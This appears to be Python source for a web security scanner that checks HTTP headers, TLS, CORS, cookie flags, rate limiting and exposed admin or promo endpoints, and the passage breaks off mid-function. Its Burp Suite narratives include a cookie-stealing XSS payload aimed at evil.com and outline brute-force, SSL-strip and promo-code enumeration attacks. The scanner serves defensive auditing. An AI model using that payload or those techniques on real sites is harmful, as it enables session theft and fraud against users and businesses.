"""
Direct HTTP security checks — always run regardless of Nuclei.
Each check returns a finding dict with attacker impact narrative.
SSL Labs deep TLS analysis for Cloudflare-protected and all HTTPS sites.
"""
import ssl
import socket
import json
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

TIMEOUT = 10

# Burp Suite tool info keyed by check id
BURP_INFO = {
    "ssl": {
        "tool": "Burp Suite Scanner + Proxy",
        "how": "An attacker sets up Burp Proxy to intercept HTTPS traffic. With an invalid or missing cert, the browser throws a warning — attackers on the same network can serve their own cert and read all traffic in plaintext inside Burp's HTTP history.",
        "academy_topic": "TLS / Transport Layer Security",
        "academy_path": "https://portswigger.net/web-security",
    },
    "hsts": {
        "tool": "Burp Suite Proxy (SSL Strip)",
        "how": "The attacker fires up Burp Proxy and uses the 'SSL Pass Through' or a custom match-and-replace rule to strip 'https://' from links, silently downgrading your users to plain HTTP. Without HSTS the browser accepts this. Every request is then visible in Burp's HTTP History tab — cookies, passwords, session tokens.",
        "academy_topic": "HTTP request smuggling / Transport attacks",
        "academy_path": "https://portswigger.net/web-security/request-smuggling",
    },
    "csp": {
        "tool": "Burp Suite Scanner + Repeater + DOM Invader",
        "how": "Burp's active scanner automatically flags missing CSP and attempts XSS payloads. The attacker then uses Burp Repeater to craft a payload like <script>document.location='https://evil.com?c='+document.cookie</script> — with no CSP to block it, the browser executes it and sends session cookies to the attacker. Burp's DOM Invader extension maps every injection point automatically.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "xframe": {
        "tool": "Burp Suite Clickbandit",
        "how": "Burp ships a built-in tool called Clickbandit (Burp menu → Burp Clickbandit). The attacker pastes your URL, records a click sequence (e.g. 'confirm payment'), then Clickbandit generates an HTML file that overlays your site invisibly inside an iframe. When a victim visits the attacker's page and clicks anywhere, they're actually clicking your buttons without knowing it.",
        "academy_topic": "Clickjacking",
        "academy_path": "https://portswigger.net/web-security/clickjacking",
    },
    "xcto": {
        "tool": "Burp Suite Repeater + Intruder",
        "how": "The attacker uses Burp Repeater to upload a file containing a hidden <script> tag disguised as a JPG. Without X-Content-Type-Options: nosniff the browser sniffs the content and may execute it as JavaScript. Burp's Intruder can fuzz upload endpoints automatically to find which file types are accepted.",
        "academy_topic": "File upload vulnerabilities",
        "academy_path": "https://portswigger.net/web-security/file-upload",
    },
    "referrer": {
        "tool": "Burp Suite Proxy (HTTP History)",
        "how": "The attacker sits in Burp Proxy and watches the HTTP History tab. Every time a user navigates from your site to an external resource (image, script, analytics), the full Referer header is logged — potentially leaking private URLs like /account/reset-password?token=abc123 or /admin/users/42.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
    "permissions": {
        "tool": "Burp Suite Scanner + Browser exploit",
        "how": "If the attacker manages to get JavaScript running on your page (via XSS or a compromised ad), the absence of a Permissions-Policy means that script can silently call navigator.geolocation.getCurrentPosition(), request camera access, or read the clipboard — all without any browser-level policy blocking it. Burp Scanner flags the missing header; exploitation happens in the browser.",
        "academy_topic": "Cross-site scripting (XSS)",
        "academy_path": "https://portswigger.net/web-security/cross-site-scripting",
    },
    "server_disclosure": {
        "tool": "Burp Suite Target > Site Map + Scanner",
        "how": "The attacker sends a single request through Burp Proxy and reads the Server / X-Powered-By headers in the response. They now know you're running e.g. 'Apache/2.4.49' — a version with a known path traversal CVE (CVE-2021-41773). Burp Scanner then runs targeted active checks for that exact software version.",
        "academy_topic": "Information disclosure",
        "academy_path": "https://portswigger.net/web-security/information-disclosure",
    },
}

# SSL Labs deep-scan Burp info entries
BURP_TLS_OLD = {
    "tool": "Burp Suite Proxy + TLS Poodle PoC",
    "how": "The attacker forces a TLS downgrade to 1.0 or 1.1 by intercepting the ClientHello in Burp's Proxy and modifying the supported_versions field. Once on TLS 1.0/1.1 they can exploit BEAST (CBC cipher padding oracle) to decrypt session cookies byte-by-byte. In Burp Repeater the attacker replays requests with modified padding until the session token is recovered.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_WEAK_CIPHER = {
    "tool": "Burp Suite Proxy + Wireshark",
    "how": "The attacker uses Burp Proxy alongside Wireshark to capture TLS traffic and identify CBC cipher handshakes. Weak ciphers (3DES, RC4, CBC without AEAD) can be broken with a BEAST or Lucky13 attack — the attacker records thousands of encrypted blocks and uses Burp Repeater to craft block-aligned boundary requests that leak plaintext byte-by-byte.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_BEAST = {
    "tool": "Burp Suite Proxy (BEAST PoC)",
    "how": "BEAST (Browser Exploit Against SSL/TLS) targets TLS 1.0 + CBC ciphers. The attacker injects JavaScript into any same-origin resource on the victim's browser to perform a chosen-plaintext attack. They use Burp Proxy to intercept the CBC-encrypted blocks and — by controlling part of the plaintext — recover the session cookie within minutes. Modern TLS 1.2/1.3 with AEAD ciphers is immune.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_POODLE = {
    "tool": "Burp Suite Proxy (POODLE PoC)",
    "how": "POODLE (Padding Oracle On Downgraded Legacy Encryption) exploits SSLv3's CBC padding. The attacker forces a protocol downgrade through Burp's match-and-replace rules and uses a JavaScript injected in the browser to make 256 crafted requests per byte of the session cookie. With an average of 128 requests per byte, a 32-byte cookie takes ~4,096 requests — automated easily in Burp Intruder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_HEARTBLEED = {
    "tool": "Burp Suite + Heartbleed Extension",
    "how": "The attacker installs the Heartbleed Burp extension (BApp Store). One click sends a malformed heartbeat request that tricks the server into leaking up to 64KB of RAM — which may contain private keys, session tokens, plaintext passwords, or database credentials from other users' requests. No authentication required. The attack leaves no trace in access logs.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_DROWN = {
    "tool": "Burp Suite Scanner + SSLv2 PoC",
    "how": "DROWN works by using SSLv2 on any server sharing the same private key. The attacker sends specially crafted SSLv2 export cipher handshakes to the vulnerable server, which acts as a decryption oracle. Burp Scanner flags the SSLv2 exposure; the actual decryption uses cross-protocol stolen ciphertext from the TLS server — recovering session tokens from TLS connections without touching TLS at all.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_NO_HSTS_SSL = {
    "tool": "Burp Suite Proxy (SSL Strip)",
    "how": "Even if the server sends HSTS in an HTTP response, without HSTS the browser has no memory of this policy on first visit. The attacker positions Burp as a MitM on public Wi-Fi and uses a match-and-replace rule to strip 'https://' links to 'http://' before they reach the browser. The browser happily follows the downgraded link — Burp HTTP History logs every cookie and credential in plaintext.",
    "academy_topic": "HTTP request smuggling / Transport attacks",
    "academy_path": "https://portswigger.net/web-security/request-smuggling",
}
BURP_LOGJAM = {
    "tool": "Burp Suite Proxy + LogJam PoC",
    "how": "Logjam targets DHE_EXPORT key exchanges. The attacker MitMs the TLS handshake via Burp Proxy and downgrades the server to 512-bit 'export-grade' Diffie-Hellman. Using precomputed discrete log tables (feasible on commodity hardware), the attacker decrypts the session key in real time and reads the entire HTTPS session in Burp's HTTP History — effectively breaking HTTPS silently.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}
BURP_FREAK = {
    "tool": "Burp Suite Proxy (FREAK Attack)",
    "how": "FREAK (Factoring RSA Export Keys) forces the server to use 512-bit RSA_EXPORT keys by intercepting the ClientHello in Burp Proxy and stripping all non-export cipher suites. The resulting 512-bit key can be factored in ~7 hours on Amazon EC2. Once factored, the attacker has the session key and can decrypt all captured TLS traffic replayed through Burp Decoder.",
    "academy_topic": "TLS / Transport Layer Security",
    "academy_path": "https://portswigger.net/web-security",
}

# Exposed panel burp info template
BURP_PANEL = {
    "tool": "Burp Suite Intruder + Repeater",
    "how": "The attacker uses Burp Intruder to brute-force the login form with a credential wordlist (rockyou.txt or admin/admin defaults). Burp Repeater lets them manually craft requests — bypassing CSRF tokens, testing SQL injection in the username field, or replaying authenticated sessions. An exposed panel with no rate limiting can be cracked in minutes.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_CORS = {
    "tool": "Burp Suite Repeater + CORS PoC",
    "how": "The attacker crafts a malicious page on evil.com that makes a fetch() request to your API with credentials (cookies). Because CORS reflects any origin or allows credentials with a wildcard, the browser sends the victim's session cookies — and the attacker's page can read the full API response, including account balances, personal data, and auth tokens. Burp Repeater is used to discover the misconfiguration by adding an Origin: header and inspecting the response.",
    "academy_topic": "Cross-origin resource sharing (CORS)",
    "academy_path": "https://portswigger.net/web-security/cors",
}

BURP_COOKIE = {
    "tool": "Burp Suite Proxy (HTTP History + Cookie Editor)",
    "how": "In Burp Proxy, the attacker intercepts responses and inspects Set-Cookie headers. Missing HttpOnly means JavaScript (injected via XSS) can read the cookie with document.cookie and send it to a remote server. Missing Secure means the cookie travels over plain HTTP on redirects or mixed-content loads. Missing SameSite=Strict means the cookie is sent on cross-site requests, enabling CSRF. Burp's Cookie Editor extension makes it trivial to replay stolen cookies.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_RATE_LIMIT = {
    "tool": "Burp Suite Intruder (Sniper / Pitchfork mode)",
    "how": "The attacker loads the login, OTP, or promo redemption endpoint into Burp Intruder and fires thousands of requests per second with no throttling from the server. Sniper mode cycles through a password or promo code wordlist automatically. No rate limiting means credential stuffing, OTP brute force, or bonus code enumeration succeeds in minutes with zero lockout.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}

BURP_JS_SECRET = {
    "tool": "Burp Suite Target > Site Map + Decoder",
    "how": "Burp Spider automatically crawls all JavaScript files linked from the target and adds them to the Site Map. The attacker then uses Burp's Search (Ctrl+F across all responses) to grep for keywords: 'api_key', 'secret', 'Bearer', 'Authorization'. Once found, the key is decoded with Burp Decoder and used directly against the API — granting the same access as the application itself.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_SUBDOMAIN = {
    "tool": "Burp Suite Target > Site Map + Intruder (subdomain fuzz)",
    "how": "The attacker loads a subdomain wordlist into Burp Intruder and fuzzes the Host header against the root IP. Discovered subdomains (admin., staging., api., dev.) are added to Burp's scope. These environments often have relaxed security — no WAF, debug endpoints enabled, or older software versions. Burp Scanner then runs full active checks against each discovered subdomain.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_PROMO = {
    "tool": "Burp Suite Repeater + Intruder",
    "how": "The attacker intercepts a promo/bonus redemption request in Burp Proxy, sends it to Repeater and replays it with modified parameters (changing promo codes, user IDs, or amounts). Burp Intruder then automates code enumeration — cycling through alphanumeric promo codes until valid ones are discovered. No rate limiting + predictable code formats = free credits at scale.",
    "academy_topic": "Business logic vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/logic-flaws",
}

CHECKS = [
    {
        "id": "hsts",
        "name": "HTTP Strict Transport Security (HSTS)",
        "category": "Transport Security",
        "severity_fail": "high",
        "header": "strict-transport-security",
        "attacker_can": "Intercept your traffic by tricking browsers into using plain HTTP instead of HTTPS — a classic downgrade or man-in-the-middle attack on public Wi-Fi.",
        "attacker_cannot": "Force your browser onto plain HTTP — all connections stay encrypted even if someone tampers with links.",
        "recommendation": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    {
        "id": "csp",
        "name": "Content Security Policy (CSP)",
        "category": "Injection Defence",
        "severity_fail": "high",
        "header": "content-security-policy",
        "attacker_can": "Inject malicious scripts into your pages (Cross-Site Scripting / XSS) and steal session cookies, credentials, or redirect users to phishing sites.",
        "attacker_cannot": "Run unauthorised scripts on your pages — the browser blocks anything not on your approved list.",
        "recommendation": "Add a Content-Security-Policy header defining trusted script/style sources.",
    },
    {
        "id": "xframe",
        "name": "Clickjacking Protection (X-Frame-Options)",
        "category": "UI Redress",
        "severity_fail": "medium",
        "header": "x-frame-options",
        "attacker_can": "Load your website invisibly inside an iframe on a malicious page and trick users into clicking buttons they can't see — stealing clicks, approving transactions, or changing settings.",
        "attacker_cannot": "Embed your site in a hidden iframe — browsers refuse to load it inside other pages.",
        "recommendation": "Add header: X-Frame-Options: DENY (or SAMEORIGIN if framing on your own domain is needed).",
    },
    {
        "id": "xcto",
        "name": "MIME-Type Sniffing Protection (X-Content-Type-Options)",
        "category": "Content Security",
        "severity_fail": "medium",
        "header": "x-content-type-options",
        "attacker_can": "Upload a file containing hidden JavaScript and trick older browsers into executing it as a script by exploiting MIME-type guessing.",
        "attacker_cannot": "Trick browsers into misinterpreting file types — content is always treated as declared.",
        "recommendation": "Add header: X-Content-Type-Options: nosniff",
    },
    {
        "id": "referrer",
        "name": "Referrer Policy",
        "category": "Privacy & Info Leakage",
        "severity_fail": "low",
        "header": "referrer-policy",
        "attacker_can": "See the full URL your users came from (including sensitive path or query parameters) by reading the Referer header your site leaks to third-party resources.",
        "attacker_cannot": "Harvest URL paths from your visitors via the Referer header — the policy controls exactly what gets shared.",
        "recommendation": "Add header: Referrer-Policy: strict-origin-when-cross-origin",
    },
    {
        "id": "permissions",
        "name": "Permissions Policy",
        "category": "Browser Feature Control",
        "severity_fail": "low",
        "header": "permissions-policy",
        "attacker_can": "Abuse browser features like camera, microphone, or geolocation if malicious code runs on your site — there are no restrictions in place to block it.",
        "attacker_cannot": "Silently access camera, microphone, or location via injected scripts — browser features are locked down by policy.",
        "recommendation": "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    {
        "id": "server_disclosure",
        "name": "Server Technology Disclosure",
        "category": "Information Leakage",
        "severity_fail": "info",
        "header": None,
        "attacker_can": "Identify exactly which web server and version you're running, then look up known exploits for that specific version to target you precisely.",
        "attacker_cannot": "Fingerprint your server stack from response headers — your technology choices stay private.",
        "recommendation": "Remove or obscure the Server and X-Powered-By headers in your web server config.",
    },
]


# Cloudflare IP ranges (updated 2024)
_CF_IP_RANGES = [
    "103.21.244.", "103.22.200.", "103.31.4.", "104.16.", "104.17.",
    "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
    "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "108.162.",
    "131.0.72.", "141.101.64.", "141.101.65.", "141.101.66.", "141.101.67.",
    "162.158.", "172.64.", "172.65.", "172.66.", "172.67.", "172.68.",
    "172.69.", "172.70.", "172.71.", "188.114.96.", "188.114.97.",
    "188.114.98.", "188.114.99.", "190.93.240.", "190.93.241.",
    "190.93.242.", "190.93.243.", "197.234.240.", "197.234.241.",
    "198.41.128.", "198.41.129.", "198.41.130.", "198.41.131.",
    "199.27.128.", "199.27.129.", "199.27.130.", "199.27.131.",
]


def _detect_cloudflare(headers: dict, hostname: str) -> dict:
    """
    Detect if the site is behind Cloudflare.
    Returns a dict with is_cloudflare bool and details.
    """
    signals = []
    score = 0

    # Header signals
    server = headers.get("server", "").lower()
    if "cloudflare" in server:
        signals.append("Server: cloudflare header present")
        score += 3
    if "cf-ray" in headers:
        signals.append(f"CF-Ray: {headers['cf-ray']}")
        score += 3
    if "cf-cache-status" in headers:
        signals.append(f"CF-Cache-Status: {headers['cf-cache-status']}")
        score += 2
    if "cf-request-id" in headers:
        signals.append("CF-Request-ID header detected")
        score += 2
    if "__cf_bm" in headers.get("set-cookie", ""):
        signals.append("Cloudflare bot management cookie (__cf_bm)")
        score += 2
    if "expect-ct" in headers and "cloudflare" in headers.get("expect-ct", "").lower():
        signals.append("Expect-CT header from Cloudflare")
        score += 1

    # DNS / IP signal
    try:
        ip = socket.gethostbyname(hostname)
        is_cf_ip = any(ip.startswith(prefix) for prefix in _CF_IP_RANGES)
        if is_cf_ip:
            signals.append(f"IP {ip} is in Cloudflare's address space")
            score += 3
        else:
            signals.append(f"IP {ip} (not a Cloudflare IP — may be direct/CDN)")
    except Exception:
        ip = "unknown"

    is_cloudflare = score >= 3

    return {
        "detected": is_cloudflare,
        "confidence": "High" if score >= 5 else "Medium" if score >= 3 else "Low",
        "signals": signals,
        "ip": ip if "ip" in dir() else "unknown",
        "note": (
            "This site is proxied through Cloudflare. Some security findings (HSTS, security headers) "
            "should be fixed in the Cloudflare Dashboard — not on the origin server. "
            "Origin server IP is hidden behind Cloudflare's network."
        ) if is_cloudflare else (
            "No Cloudflare proxy detected. This appears to be a direct connection to the origin server."
        ),
        "fix_location": "Cloudflare Dashboard (SSL/TLS → Edge Certificates and Security settings)" if is_cloudflare else "Origin web server configuration",
    }


def _fetch(url: str):
    req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        headers = {k.lower(): v for k, v in resp.headers.items()}
        return headers, resp.status, resp.url


def _check_ssl(url: str) -> dict:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base = {
        "id": "ssl",
        "name": "HTTPS / SSL Encryption",
        "category": "Transport Security",
        "burp": BURP_INFO["ssl"],
    }
    if parsed.scheme != "https":
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Intercept ALL traffic between your users and the server in plain text — passwords, session tokens, personal data — because no encryption is in use.",
                "attacker_cannot": None,
                "recommendation": "Enable HTTPS by installing a TLS certificate (free via Let's Encrypt).",
                "detail": "Site is not served over HTTPS."}
    hostname = parsed.hostname
    port = parsed.port or 443
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((hostname, port), timeout=TIMEOUT), server_hostname=hostname) as s:
            cert = s.getpeercert()
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        if days_left < 0:
            return {**base, "severity": "critical", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Trigger browser security warnings for all visitors — the certificate has expired so HTTPS trust is broken.",
                    "attacker_cannot": None,
                    "recommendation": "Renew your TLS certificate immediately.",
                    "detail": f"Certificate expired {abs(days_left)} days ago."}
        if days_left < 30:
            return {**base, "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Exploit the upcoming certificate expiry — once expired, all HTTPS trust breaks and users see security warnings.",
                    "attacker_cannot": None,
                    "recommendation": f"Renew your TLS certificate — expires in {days_left} days.",
                    "detail": f"Certificate expires in {days_left} days."}
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic in plain text — the connection is encrypted with a valid certificate.",
                "recommendation": None,
                "detail": f"Valid certificate, expires in {days_left} days."}
    except ssl.SSLCertVerificationError as e:
        return {**base, "severity": "critical", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": "Present a fake certificate — browsers warn users that the connection is not trusted.",
                "attacker_cannot": None,
                "recommendation": "Fix the SSL certificate — ensure it's from a trusted CA and matches the domain.",
                "detail": f"SSL verification failed: {e}"}
    except Exception:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Intercept traffic — HTTPS is in use.",
                "recommendation": None, "detail": "HTTPS in use."}


def _check_exposed_panels(base_url: str) -> list:
    paths = [
        ("/admin", "Admin Panel"),
        ("/wp-admin", "WordPress Admin"),
        ("/wp-login.php", "WordPress Login"),
        ("/administrator", "Joomla Admin"),
        ("/phpmyadmin", "phpMyAdmin"),
        ("/login", "Login Page"),
        ("/.env", "Environment Config File"),
        ("/config.php", "PHP Config File"),
        ("/server-status", "Apache Server Status"),
    ]
    findings = []
    base = base_url.rstrip("/")
    for path, label in paths:
        try:
            req = urllib.request.Request(base + path, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status == 200:
                    findings.append({
                        "id": f"exposed_{path.strip('/').replace('/', '_') or 'panel'}",
                        "name": f"Exposed {label}",
                        "category": "Exposed Panels",
                        "severity": "critical" if ".env" in path or "config" in path else "high",
                        "status": "vulnerable",
                        "matched_at": base + path,
                        "attacker_can": f"Access the {label} at {path} without any restriction — this could allow full account takeover, credential theft, or database access.",
                        "attacker_cannot": None,
                        "recommendation": f"Restrict access to {path} by IP, add authentication, or remove it if unused.",
                        "detail": f"HTTP 200 returned from {path}",
                        "burp": BURP_PANEL,
                    })
        except Exception:
            pass
    return findings


def _check_cors(url: str) -> dict:
    """Test for CORS misconfiguration by sending a spoofed Origin header."""
    import urllib.parse
    base = {
        "id": "cors",
        "name": "CORS (Cross-Origin Resource Sharing) Policy",
        "category": "Access Control",
        "burp": BURP_CORS,
    }
    evil_origin = "https://evil-attacker.com"
    try:
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "CyberScan/1.0 Security Audit",
                "Origin": evil_origin,
            },
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            headers = {k.lower(): v for k, v in resp.headers.items()}

        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "").lower()

        if acao == "*" and acac == "true":
            return {**base, "severity": "critical", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Make cross-origin requests with victim credentials and READ the full response — ACAO: * combined with credentials:true is the most dangerous CORS misconfiguration. Any website can steal your users' data.",
                    "attacker_cannot": None,
                    "recommendation": "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Use an explicit allowlist of trusted origins.",
                    "detail": f"Access-Control-Allow-Origin: {acao} | Access-Control-Allow-Credentials: {acac}"}
        elif acao == evil_origin:
            if acac == "true":
                return {**base, "severity": "critical", "status": "vulnerable",
                        "matched_at": url,
                        "attacker_can": "Reflect any attacker origin back and allow credentials — a complete CORS bypass. Any site can impersonate a trusted origin and steal authenticated API responses including account data, tokens and balances.",
                        "attacker_cannot": None,
                        "recommendation": "Validate the Origin header against a strict allowlist. Never reflect arbitrary origins. Do not combine wildcard with credentials.",
                        "detail": f"Server reflected attacker Origin: {evil_origin} with Allow-Credentials: true"}
            else:
                return {**base, "severity": "high", "status": "vulnerable",
                        "matched_at": url,
                        "attacker_can": "Make unauthenticated cross-origin API requests from any domain — the server reflects any origin as trusted. Public API data can be scraped and abused from attacker-controlled sites.",
                        "attacker_cannot": None,
                        "recommendation": "Restrict Access-Control-Allow-Origin to an explicit whitelist of trusted domains. Do not reflect arbitrary origins.",
                        "detail": f"Server reflected attacker Origin: {evil_origin}"}
        elif acao == "*":
            return {**base, "severity": "medium", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Make cross-origin requests from any domain to access public API endpoints — useful for data scraping, API abuse, and as a stepping stone if XSS is found.",
                    "attacker_cannot": "Read authenticated responses — wildcard cannot be combined with credentials.",
                    "recommendation": "Restrict CORS to specific trusted origins rather than using a wildcard, even for public APIs.",
                    "detail": "Access-Control-Allow-Origin: * (wildcard — any origin can make requests)"}
        else:
            return {**base, "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None,
                    "attacker_cannot": "Make cross-origin requests from arbitrary domains — CORS is either absent or correctly restricted.",
                    "recommendation": None,
                    "detail": f"ACAO: '{acao}' — attacker origin was not reflected."}
    except Exception as e:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": None,
                "recommendation": None,
                "detail": f"CORS check skipped: {e}"}


def _check_cookie_security(headers: dict, url: str) -> list:
    """Inspect Set-Cookie headers for missing security flags."""
    findings = []
    raw_cookies = headers.get("set-cookie", "")
    if not raw_cookies:
        return findings

    # Some servers send multiple Set-Cookie as comma-joined in urllib
    cookies = [c.strip() for c in raw_cookies.split(",") if "=" in c.split(";")[0]]

    SESSION_NAMES = {"session", "sessionid", "sess", "sid", "auth", "token",
                     "jwt", "access_token", "refresh_token", "phpsessid",
                     "laravel_session", "user_session", "login", "remember"}

    for cookie in cookies:
        parts = [p.strip().lower() for p in cookie.split(";")]
        cookie_name = parts[0].split("=")[0].strip().lower() if parts else ""
        is_session = any(s in cookie_name for s in SESSION_NAMES)
        severity_base = "high" if is_session else "medium"

        has_httponly = any(p == "httponly" for p in parts)
        has_secure = any(p == "secure" for p in parts)
        has_samesite = any(p.startswith("samesite") for p in parts)

        issues = []
        if not has_httponly:
            issues.append("HttpOnly missing")
        if not has_secure:
            issues.append("Secure missing")
        if not has_samesite:
            issues.append("SameSite missing")

        if issues:
            label = f"'{cookie_name}'" if cookie_name else "session"
            findings.append({
                "id": f"cookie_{cookie_name or 'unknown'}",
                "name": f"Insecure Cookie Flags — {label}",
                "category": "Session Security",
                "severity": severity_base,
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"{'Steal the ' + label + ' session token via XSS (document.cookie) because HttpOnly is not set. ' if not has_httponly else ''}"
                    f"{'Intercept the cookie over HTTP connections because Secure flag is missing. ' if not has_secure else ''}"
                    f"{'Perform CSRF attacks — the cookie is sent on cross-site requests because SameSite is not set. ' if not has_samesite else ''}"
                ).strip(),
                "attacker_cannot": None,
                "recommendation": f"Set cookie flags: Set-Cookie: {cookie_name}=...; HttpOnly; Secure; SameSite=Strict",
                "detail": f"Cookie {label}: {', '.join(issues)}",
                "burp": BURP_COOKIE,
            })

    if not findings:
        raw_name = raw_cookies.split("=")[0].strip() if raw_cookies else "session"
        findings.append({
            "id": "cookie_security",
            "name": "Cookie Security Flags",
            "category": "Session Security",
            "severity": "info",
            "status": "protected",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": "Steal or misuse session cookies via XSS or CSRF — HttpOnly, Secure and SameSite flags are correctly set.",
            "recommendation": None,
            "detail": "Session cookies have correct security flags.",
            "burp": None,
        })
    return findings


def _check_rate_limiting(url: str) -> dict:
    """Send 12 rapid requests and check for rate limiting signals."""
    base = {
        "id": "rate_limiting",
        "name": "Rate Limiting / Brute Force Protection",
        "category": "Access Control",
        "burp": BURP_RATE_LIMIT,
    }
    rate_limited = False
    detail_parts = []
    try:
        for i in range(12):
            req = urllib.request.Request(url, headers={"User-Agent": f"CyberScan/1.0 probe-{i}"})
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    h = {k.lower(): v for k, v in resp.headers.items()}
                    if resp.status == 429:
                        rate_limited = True
                        detail_parts.append(f"HTTP 429 on request {i+1}")
                        break
                    if any(k.startswith("x-ratelimit") or k == "retry-after" for k in h):
                        rate_limited = True
                        rl_headers = {k: v for k, v in h.items() if "ratelimit" in k or k == "retry-after"}
                        detail_parts.append(f"Rate limit headers: {rl_headers}")
                        break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    rate_limited = True
                    detail_parts.append(f"HTTP 429 on request {i+1}")
                    break

        if rate_limited:
            return {**base, "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None,
                    "attacker_cannot": "Brute force login, OTP, or promo code endpoints without being throttled — rate limiting is active.",
                    "recommendation": None,
                    "detail": f"Rate limiting detected: {'; '.join(detail_parts)}"}
        else:
            return {**base, "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Brute force login passwords, enumerate OTP codes, or cycle through promo/bonus codes at unlimited speed using Burp Intruder — 12 rapid requests received no throttling, 429 response, or rate-limit headers.",
                    "attacker_cannot": None,
                    "recommendation": "Implement rate limiting on authentication and sensitive endpoints: max 5 attempts per minute per IP. Return HTTP 429 with Retry-After header. Consider CAPTCHA after 3 failures.",
                    "detail": "12 rapid requests sent — no HTTP 429, no X-RateLimit-*, no Retry-After header detected."}
    except Exception as e:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": None,
                "recommendation": None,
                "detail": f"Rate limit check skipped: {e}"}


def _check_promo_endpoints(base_url: str) -> list:
    """Probe for exposed promo, bonus, coupon and referral endpoints."""
    paths = [
        ("/promo", "Promo Endpoint"),
        ("/promotion", "Promotion Endpoint"),
        ("/promotions", "Promotions Endpoint"),
        ("/bonus", "Bonus Endpoint"),
        ("/bonuses", "Bonuses Endpoint"),
        ("/coupon", "Coupon Endpoint"),
        ("/coupons", "Coupons Endpoint"),
        ("/voucher", "Voucher Endpoint"),
        ("/vouchers", "Vouchers Endpoint"),
        ("/referral", "Referral Endpoint"),
        ("/referrals", "Referrals Endpoint"),
        ("/api/promo", "API Promo Endpoint"),
        ("/api/bonus", "API Bonus Endpoint"),
        ("/api/coupon", "API Coupon Endpoint"),
        ("/api/voucher", "API Voucher Endpoint"),
        ("/api/referral", "API Referral Endpoint"),
        ("/api/v1/promo", "API v1 Promo Endpoint"),
        ("/api/v1/bonus", "API v1 Bonus Endpoint"),
        ("/api/v1/coupon", "API v1 Coupon Endpoint"),
        ("/api/v2/promo", "API v2 Promo Endpoint"),
        ("/api/v2/bonus", "API v2 Bonus Endpoint"),
        ("/reward", "Reward Endpoint"),
        ("/rewards", "Rewards Endpoint"),
        ("/free-bet", "Free Bet Endpoint"),
        ("/freebet", "Free Bet Endpoint"),
        ("/cashback", "Cashback Endpoint"),
        ("/loyalty", "Loyalty Program Endpoint"),
        ("/redeem", "Redeem Endpoint"),
        ("/claim", "Claim Endpoint"),
    ]
    findings = []
    base = base_url.rstrip("/")
    for path, label in paths:
        try:
            req = urllib.request.Request(
                base + path,
                headers={"User-Agent": "CyberScan/1.0 Security Audit"},
            )
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    status = resp.status
                    body_preview = resp.read(512).decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                status = e.code
                body_preview = ""

            if status in (200, 201, 301, 302):
                # Check if body looks like API/promo data
                interesting = any(kw in body_preview.lower() for kw in
